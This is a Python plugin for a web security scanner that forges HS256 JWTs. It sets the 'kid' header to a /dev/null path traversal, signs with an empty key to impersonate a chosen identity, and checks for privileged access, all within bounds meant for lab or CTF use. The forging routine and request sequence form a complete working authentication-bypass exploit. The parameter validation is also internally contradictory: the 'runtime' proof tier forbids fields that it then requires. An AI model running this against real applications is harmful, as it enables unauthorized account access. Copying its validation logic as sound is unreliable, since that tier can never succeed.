"""Bounded JWT ``kid`` path-traversal confirmation.

The only supported mode consumes a server-injected low-privilege session,
constructs an empty-HMAC negative control and a tool-owned ``/dev/null``
traversal token, and proves the exact original/control/attack/original
differential before an explicitly approved lab/CTF effect. Raw cookies and JWTs
never leave the agent output.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
from html import unescape
from http.cookies import SimpleCookie
from typing import Any, Dict, Iterable, List, Optional, Tuple
from urllib.parse import urljoin, urlsplit

import aiohttp

from plugin_interface import ToolPlugin
from tools._agentic_exploration_common import read_limited
from tools.web_authentication_probe import (
    REDACTED_RUNTIME_SECRET,
    _http_target,
    _path_and_query,
    _relative_path,
    sanitize_evidence_text,
)


ALLOWED_MODES = {"kid-path-traversal-empty-hmac"}
ALLOWED_ENGAGEMENTS = {"lab", "ctf"}
# #1648 — two-tier proof. The runtime tier proves the vulnerability from its own
# evidence and needs no PortSwigger status page; the lab tier brackets it with the
# unsolved -> solved transition for calibration. Before this, the transition was
# mandatory at BOTH layers, so a confirmed finding on a customer application was
# impossible by construction.
ALLOWED_PROOF_LEVELS = {"runtime-key-confusion", "lab-state-change"}
STATE_CHANGE_ENGAGEMENTS = {"lab", "ctf"}
_STATE_CHANGE_PARAMETERS = {
    "effectPath",
    "expectedEffectLocation",
    "expectedEffectStatus",
    "expectedSolvedStatus",
    "expectedStatusStatus",
    "solvedMarker",
    "stateChangeApproved",
    "statusPath",
    "unsolvedMarker",
}
RUNTIME_EXPECTED_STEP_LABELS = (
    "original-token-denied",
    "empty-hmac-original-kid-denied",
    "kid-traversal-privileged",
    "original-token-replay-denied",
)
LAB_EXPECTED_STEP_LABELS = (
    "unsolved-baseline",
    *RUNTIME_EXPECTED_STEP_LABELS,
    "authorized-effect",
    "solved-confirmation",
)
EXPECTED_STEP_LABELS_BY_PROOF_LEVEL = {
    "runtime-key-confusion": RUNTIME_EXPECTED_STEP_LABELS,
    "lab-state-change": LAB_EXPECTED_STEP_LABELS,
}
# Back-compat alias; equals the lab shape.
EXPECTED_STEP_LABELS = LAB_EXPECTED_STEP_LABELS
FIXED_TRAVERSAL_KID = "../../../../../../../dev/null"
MAX_TOKEN_CHARS = 32_768
MAX_JWT_JSON_BYTES = 16_384
MAX_CLAIMS = 64
MAX_RESPONSE_BYTES = 60_000
MAX_EVIDENCE_CHARS = 65_000
MAX_MARKER_CHARS = 512

_COOKIE_NAME = re.compile(r"^[!#$%&'*+\-.^_`|~0-9A-Za-z]{1,128}$")
_CLAIM_NAME = re.compile(r"^[A-Za-z_][A-Za-z0-9_.:-]{0,127}$")
_IDENTITY = re.compile(r"^[A-Za-z0-9_.@:-]{1,128}$")
_BASE64URL_SEGMENT = re.compile(r"^[A-Za-z0-9_-]+$")
_COMPACT_JWT = re.compile(
    r"(?<![A-Za-z0-9_-])[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}(?![A-Za-z0-9_-])"
)


class JwtProbeError(ValueError):
    """Raised for malformed or unsupported JWT proof material."""


def _sha256_bytes(value: bytes) -> str:
    return hashlib.sha256(value).hexdigest()


def _sha256_text(value: str) -> str:
    return _sha256_bytes(value.encode("utf-8"))


def _reject_duplicate_pairs(pairs: List[Tuple[str, Any]]) -> Dict[str, Any]:
    result: Dict[str, Any] = {}
    for key, value in pairs:
        if key in result:
            raise JwtProbeError("JWT JSON contains a duplicate key")
        result[key] = value
    return result


def _decode_segment(segment: str) -> bytes:
    if (
        not segment
        or len(segment) > MAX_TOKEN_CHARS
        or _BASE64URL_SEGMENT.fullmatch(segment) is None
    ):
        raise JwtProbeError("JWT segment is empty, oversized, padded, or not base64url")
    padded = segment + "=" * (-len(segment) % 4)
    try:
        decoded = base64.urlsafe_b64decode(padded.encode("ascii"))
    except Exception as exc:
        raise JwtProbeError("JWT segment is not valid base64url") from exc
    if not decoded or len(decoded) > MAX_JWT_JSON_BYTES:
        raise JwtProbeError("JWT segment decoded size is outside the bounded contract")
    if _b64url(decoded) != segment:
        raise JwtProbeError("JWT segment is not canonical unpadded base64url")
    return decoded


def _b64url(value: bytes) -> str:
    return base64.urlsafe_b64encode(value).decode("ascii").rstrip("=")


def _strict_json_object(segment: str, label: str) -> Tuple[Dict[str, Any], bytes]:
    raw = _decode_segment(segment)
    try:
        parsed = json.loads(
            raw.decode("utf-8"),
            object_pairs_hook=_reject_duplicate_pairs,
            parse_constant=lambda value: (_ for _ in ()).throw(
                JwtProbeError(f"{label} contains non-finite JSON")
            ),
        )
    except JwtProbeError:
        raise
    except Exception as exc:
        raise JwtProbeError(f"{label} is not strict UTF-8 JSON") from exc
    if not isinstance(parsed, dict):
        raise JwtProbeError(f"{label} must be a JSON object")
    return parsed, raw


def _safe_scalar(value: Any) -> bool:
    if value is None or isinstance(value, bool):
        return True
    if isinstance(value, int):
        return -(2**63) <= value <= 2**63 - 1
    if isinstance(value, str):
        return len(value.encode("utf-8")) <= 2_048 and "\0" not in value
    return False


def _canonical_json(value: Dict[str, Any]) -> bytes:
    return json.dumps(
        value,
        ensure_ascii=False,
        separators=(",", ":"),
        sort_keys=True,
        allow_nan=False,
    ).encode("utf-8")


def parse_compact_jwt(
    token: str,
    identity_claim: str,
    source_identity: str,
) -> Dict[str, Any]:
    if (
        not isinstance(token, str)
        or len(token) < 24
        or len(token) > MAX_TOKEN_CHARS
        or any(ch in token for ch in "\r\n\0\t ")
    ):
        raise JwtProbeError("session JWT is empty, oversized, or contains unsafe whitespace")
    parts = token.split(".")
    if len(parts) != 3 or not parts[2]:
        raise JwtProbeError("session JWT must be a three-segment compact JWS")
    header, header_raw = _strict_json_object(parts[0], "JWT header")
    payload, payload_raw = _strict_json_object(parts[1], "JWT payload")
    _decode_segment(parts[2])

    if header.get("alg") != "HS256":
        raise JwtProbeError("session JWT must use HS256 for this bounded mode")
    if not isinstance(header.get("kid"), str) or not header["kid"] or len(header["kid"]) > 512:
        raise JwtProbeError("session JWT must contain a bounded string kid")
    if len(header) > 32 or len(payload) > MAX_CLAIMS:
        raise JwtProbeError("JWT header or claim count exceeds the bounded contract")
    if any(not isinstance(key, str) or len(key) > 128 for key in header):
        raise JwtProbeError("JWT header member name is unsafe")
    if any(not isinstance(key, str) or len(key) > 128 for key in payload):
        raise JwtProbeError("JWT claim name is unsafe")
    if any(not _safe_scalar(value) for value in header.values()):
        raise JwtProbeError("JWT header values must be bounded scalars")
    if any(not _safe_scalar(value) for value in payload.values()):
        raise JwtProbeError("JWT claims must be bounded scalars")
    if payload.get(identity_claim) != source_identity:
        raise JwtProbeError("configured source identity does not match the session JWT")

    return {
        "token": token,
        "parts": tuple(parts),
        "header": header,
        "payload": payload,
        "headerRaw": header_raw,
        "payloadRaw": payload_raw,
    }


def forge_kid_path_traversal_tokens(
    parsed: Dict[str, Any],
    identity_claim: str,
    target_identity: str,
) -> Dict[str, Any]:
    original_header = parsed["header"]
    original_payload = parsed["payload"]
    control_header = dict(original_header)
    attack_header = dict(original_header)
    attack_header["kid"] = FIXED_TRAVERSAL_KID
    mutated_payload = dict(original_payload)
    mutated_payload[identity_claim] = target_identity

    if set(mutated_payload) != set(original_payload):
        raise JwtProbeError("JWT mutation added or removed a claim")
    changed_payload = [
        key for key in original_payload if original_payload[key] != mutated_payload[key]
    ]
    changed_header = [
        key for key in control_header if control_header[key] != attack_header.get(key)
    ]
    if changed_payload != [identity_claim] or changed_header != ["kid"]:
        raise JwtProbeError("JWT mutation exceeded the exact one-claim/one-header delta")

    payload_segment = _b64url(_canonical_json(mutated_payload))

    def sign(header: Dict[str, Any]) -> Tuple[str, str]:
        header_segment = _b64url(_canonical_json(header))
        signing_input = f"{header_segment}.{payload_segment}".encode("ascii")
        signature = hmac.new(b"", signing_input, hashlib.sha256).digest()
        return f"{header_segment}.{payload_segment}.{_b64url(signature)}", header_segment

    control_token, control_header_segment = sign(control_header)
    attack_token, attack_header_segment = sign(attack_header)
    return {
        "controlToken": control_token,
        "attackToken": attack_token,
        "controlHeaderSegment": control_header_segment,
        "attackHeaderSegment": attack_header_segment,
        "payloadSegment": payload_segment,
        "changedPayloadClaims": changed_payload,
        "changedHeaderMembers": changed_header,
    }


def _safe_marker(value: Any) -> Optional[str]:
    marker = str(value or "")
    if (
        len(marker) < 3
        or len(marker) > MAX_MARKER_CHARS
        or any(ch in marker for ch in "\r\n\0")
        or _COMPACT_JWT.search(marker)
    ):
        return None
    return marker


def _bounded_status(
    parameters: Dict[str, Any],
    name: str,
    minimum: int,
    maximum: int,
) -> Optional[int]:
    try:
        value = int(parameters[name])
    except (KeyError, TypeError, ValueError):
        return None
    return value if minimum <= value <= maximum else None


def _session_cookie_value(parameters: Dict[str, Any], cookie_name: str) -> Optional[str]:
    raw = parameters.get("authCookies") or parameters.get("cookie")
    if not isinstance(raw, str) or not raw or len(raw) > 65_536 or "\0" in raw:
        return None
    parsed = SimpleCookie()
    try:
        parsed.load(raw)
    except Exception:
        return None
    morsel = parsed.get(cookie_name)
    if morsel is None:
        return None
    value = morsel.value
    return value if 24 <= len(value) <= MAX_TOKEN_CHARS else None


def validate_probe_parameters(parameters: Dict[str, Any]) -> Tuple[bool, str]:
    target = _http_target(parameters.get("target") or parameters.get("url"))
    if not target:
        return False, "target must be a credential-free HTTP(S) base URL"
    if str(parameters.get("mode") or "").lower() not in ALLOWED_MODES:
        return False, "mode must be kid-path-traversal-empty-hmac"
    if str(parameters.get("engagement") or "").lower() not in ALLOWED_ENGAGEMENTS:
        return False, "engagement must be lab or ctf"
    if parameters.get("allowUnsafeMethods") is not True:
        return False, "allowUnsafeMethods=true is required"

    # #1648 — tier resolution. No defaulting: an unrecognised value is rejected so
    # a typo cannot silently downgrade or upgrade the assertions.
    proof_level = str(parameters.get("proofLevel") or "").lower()
    if proof_level not in ALLOWED_PROOF_LEVELS:
        return False, "proofLevel must be runtime-key-confusion or lab-state-change"
    if proof_level == "lab-state-change":
        if str(parameters.get("engagement") or "").lower() not in STATE_CHANGE_ENGAGEMENTS:
            return False, "lab-state-change requires engagement lab or ctf"
    else:
        # The runtime tier must REJECT lab material rather than ignore it, or a
        # caller could believe a transition was proven when nothing checked it.
        unexpected = sorted(_STATE_CHANGE_PARAMETERS.intersection(parameters))
        if unexpected:
            return False, f"{unexpected[0]} is only allowed for proofLevel=lab-state-change"
    if parameters.get("stateChangeApproved") is not True:
        return False, "stateChangeApproved=true is required"

    for name in ("statusPath", "privilegePath", "effectPath", "expectedEffectLocation"):
        if not _relative_path(parameters.get(name)):
            return False, f"{name} must be a bounded same-origin relative path"
    cookie_name = str(parameters.get("cookieName") or "")
    if _COOKIE_NAME.fullmatch(cookie_name) is None:
        return False, "cookieName is invalid"
    if not _session_cookie_value(parameters, cookie_name):
        return False, "a server-injected authenticated session cookie is required"

    identity_claim = str(parameters.get("identityClaim") or "")
    source_identity = str(parameters.get("sourceIdentity") or "")
    target_identity = str(parameters.get("targetIdentity") or "")
    if (
        _CLAIM_NAME.fullmatch(identity_claim) is None
        or identity_claim.lower() in {"__proto__", "prototype", "constructor"}
    ):
        return False, "identityClaim is invalid"
    if (
        _IDENTITY.fullmatch(source_identity) is None
        or _IDENTITY.fullmatch(target_identity) is None
        or source_identity == target_identity
    ):
        return False, "sourceIdentity and targetIdentity must be distinct bounded identities"

    marker_names = ("unsolvedMarker", "deniedMarker", "privilegeMarker", "solvedMarker")
    markers = [_safe_marker(parameters.get(name)) for name in marker_names]
    if any(marker is None for marker in markers) or len(set(markers)) != 4:
        return False, "proof markers must be distinct bounded strings"

    status_bounds = {
        "expectedStatusStatus": (200, 200),
        "expectedDeniedStatus": (200, 599),
        "expectedPrivilegeStatus": (200, 399),
        "expectedEffectStatus": (300, 399),
        "expectedSolvedStatus": (200, 200),
    }
    if any(
        _bounded_status(parameters, name, *bounds) is None
        for name, bounds in status_bounds.items()
    ):
        return False, "expected statuses are outside the bounded contract"
    try:
        timeout = int(parameters.get("timeoutSeconds") or 15)
    except (TypeError, ValueError):
        return False, "timeoutSeconds must be an integer"
    if timeout < 3 or timeout > 30:
        return False, "timeoutSeconds must be between 3 and 30"
    return True, ""


def _response_contains(body: str, marker: str) -> bool:
    return marker in body or marker in unescape(body)


def _sanitize_http_text(text: Any, secrets: Iterable[Any], max_chars: int) -> str:
    sanitized = sanitize_evidence_text(text, secrets, max_chars)
    return _COMPACT_JWT.sub(REDACTED_RUNTIME_SECRET, sanitized)


def _request_transcript(method: str, url: str, cookie_name: str, include_cookie: bool) -> str:
    parsed = urlsplit(url)
    lines = [
        f"{method} {_path_and_query(url)} HTTP/1.1",
        f"Host: {parsed.netloc}",
        "User-Agent: xASM-Agentic-JWT-Probe/1.0",
        "Accept: text/html,application/xhtml+xml,text/plain",
    ]
    if include_cookie:
        lines.append(f"Cookie: {cookie_name}={REDACTED_RUNTIME_SECRET}")
    return "\r\n".join(lines) + "\r\n\r\n"


def _response_transcript(
    response: Dict[str, Any],
    secrets: Iterable[Any],
) -> Tuple[str, bool]:
    lines = [
        f"HTTP/1.1 {int(response.get('status') or 0)} "
        f"{str(response.get('reason') or '')[:100]}"
    ]
    for name in ("Content-Type", "Location", "Set-Cookie"):
        for value in response.get("headers").getall(name, []):
            lines.append(f"{name}: {value}")
    raw = "\r\n".join(lines) + "\r\n\r\n" + str(response.get("body") or "")
    oversized = len(raw) > MAX_EVIDENCE_CHARS
    return (
        _sanitize_http_text(raw, secrets, MAX_EVIDENCE_CHARS),
        bool(response.get("truncated")) or oversized,
    )


def build_http_evidence_step(
    label: str,
    url: str,
    cookie_name: str,
    include_cookie: bool,
    response: Dict[str, Any],
    secrets: Iterable[Any],
    carrier_role: str,
    carrier_sha256: str,
) -> Dict[str, Any]:
    request = _request_transcript("GET", url, cookie_name, include_cookie)
    response_text, truncated = _response_transcript(response, secrets)
    response_body = (
        response_text.split("\r\n\r\n", 1)[1]
        if "\r\n\r\n" in response_text
        else ""
    )
    return {
        "label": label,
        "carrierRole": carrier_role,
        "carrierSha256": carrier_sha256,
        "request": request,
        "requestSha256": _sha256_text(request),
        "response": response_text,
        "responseSha256": _sha256_text(response_text),
        "responseBodySha256": _sha256_text(response_body),
        "responseStatus": int(response.get("status") or 0),
        "responseBodyLength": len(response_body.encode("utf-8")),
        "responseExcerptTruncated": truncated,
    }


def build_nuclei_finding(target: str, verification: Dict[str, Any]) -> Dict[str, Any]:
    return {
        "template-id": "xasm-jwt-kid-path-traversal-candidate",
        "matcher-name": "jwt-kid-path-traversal",
        "type": "http",
        "host": target,
        "matched-at": urljoin(target, str(verification.get("privilegePath") or "/")),
        "info": {
            "name": "Verified JWT Authentication Bypass via kid Path Traversal",
            "severity": "high",
            "description": "A bounded JWT kid traversal differential reached a privileged route.",
            "remediation": (
                "Do not derive signing keys from untrusted JWT headers. Pin the verification "
                "algorithm and key server-side, reject traversal sequences, and rotate affected keys."
            ),
            "classification": {"cwe-id": ["CWE-347"]},
        },
        "evidence": verification,
    }


class JwtProbeTool(ToolPlugin):
    @property
    def name(self) -> str:
        return "web:jwt_probe"

    @property
    def description(self) -> str:
        return (
            "Confirms one bounded HS256 JWT kid path-traversal primitive with an "
            "empty-HMAC negative control and approved lab/CTF effect."
        )

    @property
    def schema(self) -> Dict[str, Any]:
        return {
            "type": "object",
            "additionalProperties": False,
            "properties": {
                "target": {"type": "string"},
                "url": {"type": "string"},
                "mode": {"type": "string", "enum": sorted(ALLOWED_MODES)},
                "proofLevel": {"type": "string", "enum": sorted(ALLOWED_PROOF_LEVELS)},
                "statusPath": {"type": "string"},
                "privilegePath": {"type": "string"},
                "effectPath": {"type": "string"},
                "expectedEffectLocation": {"type": "string"},
                "cookieName": {"type": "string"},
                "identityClaim": {"type": "string"},
                "sourceIdentity": {"type": "string"},
                "targetIdentity": {"type": "string"},
                "unsolvedMarker": {"type": "string"},
                "deniedMarker": {"type": "string"},
                "privilegeMarker": {"type": "string"},
                "solvedMarker": {"type": "string"},
                "expectedStatusStatus": {"type": "integer"},
                "expectedDeniedStatus": {"type": "integer"},
                "expectedPrivilegeStatus": {"type": "integer"},
                "expectedEffectStatus": {"type": "integer"},
                "expectedSolvedStatus": {"type": "integer"},
                "engagement": {
                    "type": "string",
                    "enum": ["standard", "aggressive", "lab", "ctf"],
                },
                "allowUnsafeMethods": {"type": "boolean", "default": False},
                "stateChangeApproved": {"type": "boolean", "default": False},
                "timeoutSeconds": {"type": "integer", "minimum": 3, "maximum": 30},
                "authCookies": {"type": "string", "x-hidden": True},
                "cookie": {"type": "string", "x-hidden": True},
            },
                        # #1648 — `required` holds only the tier-INDEPENDENT fields; the
            # lab-only ones are conditionally required AND conditionally
            # forbidden by the allOf below (same shape as web_ssti_probe.py).
            "required": [
                "mode",
                "proofLevel",
                "privilegePath",
                "cookieName",
                "identityClaim",
                "sourceIdentity",
                "targetIdentity",
                "deniedMarker",
                "privilegeMarker",
                "expectedDeniedStatus",
                "expectedPrivilegeStatus",
                "engagement",
                "allowUnsafeMethods",
            ],
            "allOf": [
                {
                    "if": {"properties": {"proofLevel": {"const": "lab-state-change"}}},
                    "then": {"required": sorted(_STATE_CHANGE_PARAMETERS)},
                    "else": {
                        "not": {
                            "anyOf": [
                                {"required": [field]}
                                for field in sorted(_STATE_CHANGE_PARAMETERS)
                            ]
                        }
                    },
                }
            ],

            "oneOf": [{"required": ["target"]}, {"required": ["url"]}],
        }

    @property
    def metadata(self) -> Dict[str, Any]:
        return {
            "category": "exploit-test",
            "phase": 4,
            "domain": ["web"],
            "input_type": ["url", "authenticated-session", "jwt"],
            "output_type": ["findings", "jwt_proof"],
            "taxonomy_domain": ["web"],
            "lifecycle_phase": "exploit-test",
            "purpose_count": "single",
            "primary_purpose": "Confirm JWT kid path-traversal authentication bypass",
            "secondary_purposes": [],
        }

    async def _request(
        self,
        session: aiohttp.ClientSession,
        url: str,
        cookie_name: str = "",
        cookie_value: str = "",
    ) -> Dict[str, Any]:
        headers = {
            "User-Agent": "xASM-Agentic-JWT-Probe/1.0",
            "Accept": "text/html,application/xhtml+xml,text/plain",
        }
        if cookie_name and cookie_value:
            headers["Cookie"] = f"{cookie_name}={cookie_value}"
        async with session.get(url, headers=headers, allow_redirects=False) as response:
            raw = await read_limited(response.content, MAX_RESPONSE_BYTES + 1)
            truncated = len(raw) > MAX_RESPONSE_BYTES
            raw = raw[:MAX_RESPONSE_BYTES]
            return {
                "status": response.status,
                "reason": str(response.reason or "")[:100],
                "headers": response.headers,
                "body": raw.decode("utf-8", errors="replace").replace("\0", ""),
                "truncated": truncated,
            }

    async def execute(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        valid, reason = validate_probe_parameters(parameters)
        if not valid:
            return {"success": False, "fallback": False, "error": reason, "findings": []}

        target = _http_target(parameters.get("target") or parameters.get("url"))
        assert target is not None
        proof_level = str(parameters["proofLevel"]).lower()
        is_lab = proof_level == "lab-state-change"
        status_url = urljoin(target, str(parameters["statusPath"])) if is_lab else ""
        privilege_url = urljoin(target, str(parameters["privilegePath"]))
        effect_url = urljoin(target, str(parameters["effectPath"])) if is_lab else ""
        cookie_name = str(parameters["cookieName"])
        original_token = _session_cookie_value(parameters, cookie_name)
        assert original_token is not None
        timeout = int(parameters.get("timeoutSeconds") or 15)
        expected_status = int(parameters["expectedStatusStatus"]) if is_lab else 0
        expected_denied = int(parameters["expectedDeniedStatus"])
        expected_privilege = int(parameters["expectedPrivilegeStatus"])
        expected_effect = int(parameters["expectedEffectStatus"]) if is_lab else 0
        expected_solved = int(parameters["expectedSolvedStatus"]) if is_lab else 0
        unsolved_marker = str(parameters["unsolvedMarker"]) if is_lab else ""
        denied_marker = str(parameters["deniedMarker"])
        privilege_marker = str(parameters["privilegeMarker"])
        solved_marker = str(parameters["solvedMarker"]) if is_lab else ""

        request_count = 0
        evidence_steps: List[Dict[str, Any]] = []
        secrets: List[Any] = [
            parameters.get("authCookies"),
            parameters.get("cookie"),
            original_token,
        ]
        try:
            parsed = parse_compact_jwt(
                original_token,
                str(parameters["identityClaim"]),
                str(parameters["sourceIdentity"]),
            )
            forged = forge_kid_path_traversal_tokens(
                parsed,
                str(parameters["identityClaim"]),
                str(parameters["targetIdentity"]),
            )
            control_token = str(forged["controlToken"])
            attack_token = str(forged["attackToken"])
            secrets.extend([control_token, attack_token])
            original_sha = _sha256_text(original_token)
            control_sha = _sha256_text(control_token)
            attack_sha = _sha256_text(attack_token)

            timeout_config = aiohttp.ClientTimeout(total=timeout, connect=min(timeout, 8))
            async with aiohttp.ClientSession(
                timeout=timeout_config,
                cookie_jar=aiohttp.DummyCookieJar(),
            ) as session:
                # #1648 — the unsolved baseline is lab-tier only.
                if is_lab:
                    baseline = await self._request(session, status_url)
                    request_count += 1
                    if (
                        baseline["truncated"]
                        or baseline["status"] != expected_status
                        or not _response_contains(baseline["body"], unsolved_marker)
                        or _response_contains(baseline["body"], solved_marker)
                    ):
                        raise JwtProbeError("anonymous status did not prove the unsolved baseline")
                    evidence_steps.append(
                        build_http_evidence_step(
                            "unsolved-baseline",
                            status_url,
                            cookie_name,
                            False,
                            baseline,
                            secrets,
                            "none",
                            "",
                        )
                    )

                original_denied = await self._request(
                    session, privilege_url, cookie_name, original_token
                )
                request_count += 1
                if (
                    original_denied["truncated"]
                    or original_denied["status"] != expected_denied
                    or not _response_contains(original_denied["body"], denied_marker)
                    or _response_contains(original_denied["body"], privilege_marker)
                ):
                    raise JwtProbeError("original JWT was not denied as configured")
                evidence_steps.append(
                    build_http_evidence_step(
                        "original-token-denied",
                        privilege_url,
                        cookie_name,
                        True,
                        original_denied,
                        secrets,
                        "original",
                        original_sha,
                    )
                )

                empty_key_control = await self._request(
                    session, privilege_url, cookie_name, control_token
                )
                request_count += 1
                if (
                    empty_key_control["truncated"]
                    or empty_key_control["status"] != expected_denied
                    or not _response_contains(empty_key_control["body"], denied_marker)
                    or _response_contains(empty_key_control["body"], privilege_marker)
                ):
                    raise JwtProbeError(
                        "empty-HMAC token with the original kid was not denied"
                    )
                evidence_steps.append(
                    build_http_evidence_step(
                        "empty-hmac-original-kid-denied",
                        privilege_url,
                        cookie_name,
                        True,
                        empty_key_control,
                        secrets,
                        "empty-hmac-original-kid",
                        control_sha,
                    )
                )

                attack_privilege = await self._request(
                    session, privilege_url, cookie_name, attack_token
                )
                request_count += 1
                if (
                    attack_privilege["truncated"]
                    or attack_privilege["status"] != expected_privilege
                    or not _response_contains(attack_privilege["body"], privilege_marker)
                    or _response_contains(attack_privilege["body"], denied_marker)
                ):
                    raise JwtProbeError("traversal JWT did not prove privileged access")
                evidence_steps.append(
                    build_http_evidence_step(
                        "kid-traversal-privileged",
                        privilege_url,
                        cookie_name,
                        True,
                        attack_privilege,
                        secrets,
                        "kid-traversal",
                        attack_sha,
                    )
                )

                original_replay = await self._request(
                    session, privilege_url, cookie_name, original_token
                )
                request_count += 1
                if (
                    original_replay["truncated"]
                    or original_replay["status"] != expected_denied
                    or not _response_contains(original_replay["body"], denied_marker)
                    or _response_contains(original_replay["body"], privilege_marker)
                ):
                    raise JwtProbeError("original JWT replay did not remain denied")
                evidence_steps.append(
                    build_http_evidence_step(
                        "original-token-replay-denied",
                        privilege_url,
                        cookie_name,
                        True,
                        original_replay,
                        secrets,
                        "original",
                        original_sha,
                    )
                )

                # #1648 — the approved effect and solved confirmation are
                # lab-tier only; the four-request differential above is the proof.
                if is_lab:
                    effect = await self._request(
                        session, effect_url, cookie_name, attack_token
                    )
                    request_count += 1
                    if (
                        effect["truncated"]
                        or effect["status"] != expected_effect
                        or str(effect["headers"].get("Location") or "")
                        != str(parameters["expectedEffectLocation"])
                    ):
                        raise JwtProbeError("approved effect did not match the configured redirect")
                    evidence_steps.append(
                        build_http_evidence_step(
                            "authorized-effect",
                            effect_url,
                            cookie_name,
                            True,
                            effect,
                            secrets,
                            "kid-traversal",
                            attack_sha,
                        )
                    )

                    solved = await self._request(session, status_url)
                    request_count += 1
                    if (
                        solved["truncated"]
                        or solved["status"] != expected_solved
                        or not _response_contains(solved["body"], solved_marker)
                        or _response_contains(solved["body"], unsolved_marker)
                    ):
                        raise JwtProbeError("post-effect status did not prove the solved transition")
                    evidence_steps.append(
                        build_http_evidence_step(
                            "solved-confirmation",
                            status_url,
                            cookie_name,
                            False,
                            solved,
                            secrets,
                            "none",
                            "",
                        )
                    )
        except Exception as exc:
            return {
                "success": False,
                "fallback": False,
                "error": _sanitize_http_text(str(exc), secrets, 500),
                "requestCount": request_count,
                "findings": [],
            }

        verification = {
            "verified": True,
            "fallback": False,
            "mode": "kid-path-traversal-empty-hmac",
            "target": target,
            "engagement": str(parameters["engagement"]).lower(),
            "allowUnsafeMethods": True,
            "proofLevel": proof_level,
            "originalDenied": True,
            "emptyHmacOriginalKidDenied": True,
            "traversalPrivilegeGranted": True,
            "originalReplayDenied": True,
            "requestCount": request_count,
            "baselineRequests": 1 if is_lab else 0,
            "controlRequests": 3,
            "probeRequests": 1,
            "effectRequests": 1 if is_lab else 0,
            "solvedChecks": 1 if is_lab else 0,
            "privilegePath": str(parameters["privilegePath"]),
            "expectedDeniedStatus": expected_denied,
            "expectedPrivilegeStatus": expected_privilege,
            "deniedMarker": denied_marker,
            "privilegeMarker": privilege_marker,
            "jwtProof": {
                "format": "compact-jws",
                "algorithm": "HS256",
                "cookieName": cookie_name,
                "identityClaim": str(parameters["identityClaim"]),
                "sourceIdentitySha256": _sha256_text(str(parameters["sourceIdentity"])),
                "targetIdentity": str(parameters["targetIdentity"]),
                "originalTokenSha256": original_sha,
                "controlTokenSha256": control_sha,
                "attackTokenSha256": attack_sha,
                "originalTokenLength": len(original_token),
                "controlTokenLength": len(control_token),
                "attackTokenLength": len(attack_token),
                "originalHeaderSha256": _sha256_bytes(parsed["headerRaw"]),
                "originalPayloadSha256": _sha256_bytes(parsed["payloadRaw"]),
                "controlHeaderSha256": _sha256_text(forged["controlHeaderSegment"]),
                "attackHeaderSha256": _sha256_text(forged["attackHeaderSegment"]),
                "mutatedPayloadSegmentSha256": _sha256_text(forged["payloadSegment"]),
                "controlPayloadSegmentSha256": _sha256_text(forged["payloadSegment"]),
                "attackPayloadSegmentSha256": _sha256_text(forged["payloadSegment"]),
                "changedPayloadLeafCount": 1,
                "changedHeaderLeafCount": 1,
                "changedPayloadClaims": forged["changedPayloadClaims"],
                "changedHeaderMembers": forged["changedHeaderMembers"],
                "originalKidSha256": _sha256_text(str(parsed["header"]["kid"])),
                "traversalKid": FIXED_TRAVERSAL_KID,
                "signingKeyStrategy": "empty-bytes",
                "signingKeyLength": 0,
            },
            "httpEvidence": {"version": 1, "steps": evidence_steps},
        }
        # #1648 — lab-only proof material, emitted only on the lab tier.
        if is_lab:
            verification.update(
                {
                    "stateChangeApproved": True,
                    "statusPath": str(parameters["statusPath"]),
                    "effectPath": str(parameters["effectPath"]),
                    "expectedEffectLocation": str(parameters["expectedEffectLocation"]),
                    "expectedStatusStatus": expected_status,
                    "expectedEffectStatus": expected_effect,
                    "expectedSolvedStatus": expected_solved,
                    "unsolvedMarker": unsolved_marker,
                    "solvedMarker": solved_marker,
                    "solvedBefore": False,
                    "effectTriggered": True,
                    "solvedAfter": True,
                }
            )
        return {
            "success": True,
            "fallback": False,
            "target": target,
            "requestCount": request_count,
            "verification": verification,
            "findings": [build_nuclei_finding(target, verification)],
            "summary": {
                "verified": True,
                "mode": "kid-path-traversal-empty-hmac",
                "requestCount": request_count,
                "findingCount": 1,
            },
        }


def get_tool() -> JwtProbeTool:
    return JwtProbeTool()
